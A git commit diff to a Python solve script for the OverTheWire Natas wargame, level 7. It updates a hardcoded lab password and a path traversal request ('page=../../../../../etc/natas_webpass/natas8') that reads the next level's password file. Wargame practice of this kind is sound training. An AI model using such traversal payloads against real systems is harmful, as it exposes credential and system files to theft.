35267c2286b4845c5b81c3bec0834423fa293e8a
Hoang Viet Anh <vietanh092004@gmail.com>
2024-06-20 07:50:13 +0700

    Fix: natas7.md

--- natas7/solve.py
+++ natas7/solve.py
@@ -2,7 +2,7 @@ import requests
 
 url = 'http://natas7.natas.labs.overthewire.org'
 s = requests.Session()
-s.auth = ('natas7', 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr')
-url += '/index.php?page=../../../../../../../etc/natas_webpass/natas8'
+s.auth = ('natas7', 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS')
+url += '/index.php?page=../../../../../etc/natas_webpass/natas8'
 r = s.get(url)
 print(r.text)
